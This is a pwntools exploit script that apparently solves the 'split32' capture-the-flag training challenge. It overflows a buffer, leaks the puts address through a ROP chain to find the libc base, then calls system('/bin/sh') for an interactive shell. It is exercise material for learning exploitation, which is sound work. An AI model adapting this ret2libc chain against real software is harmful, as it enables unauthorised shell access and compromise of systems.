from pwn import *

binary = './split32'

libc = ELF("/lib32/libc.so.6")
elf = ELF("./split32")
p = process("./split32")

# first_payload
payload = b''
payload += b'A'*0x28
payload += b'BBBB'
payload += p32( elf.plt["puts"] )
payload += p32( 0x80483e1 ) #popret
payload += p32( elf.got["puts"] )
payload += p32( elf.symbols["pwnme"] )

p.recvuntil("> ")
p.sendline( payload )
puts = u32( p.recv(4) )
libc_base = puts - 0x0067360
binsh = libc_base + 0x17b8cf

info("libc_base\t:%#x", libc_base)
info("binsh\t:%#x", binsh)

#second payload 
payload = b''
payload += b'A'*0x28
payload += b'BBBB'
payload += p32( elf.plt["system"] )
payload += p32( 0x80483e1 ) 
payload += p32( binsh )

p.recvuntil("> ")
p.sendline( payload )
p.interactive()


